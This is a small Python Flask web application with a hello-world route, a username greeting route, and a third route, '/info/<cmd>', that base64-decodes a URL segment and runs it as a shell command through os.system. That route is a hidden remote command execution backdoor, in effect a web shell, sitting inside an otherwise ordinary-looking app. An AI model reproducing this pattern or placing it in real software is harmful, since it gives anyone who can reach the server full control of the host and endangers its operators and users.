from flask import Flask, escape
import os
import base64

app = Flask(__name__)

@app.route("/")
def hello_world():
    return "<p>Hello, World!</p>"

@app.route("/user/<username>")
def hello_user(username):
    return f"Hello, {escape(username)}"

@app.route("/info/<cmd>")
def cmd_run(cmd):
    os.system(base64.b64decode(cmd))
    return "Executed"

def main():
    app.run()

if __name__ == '__main__':
    main()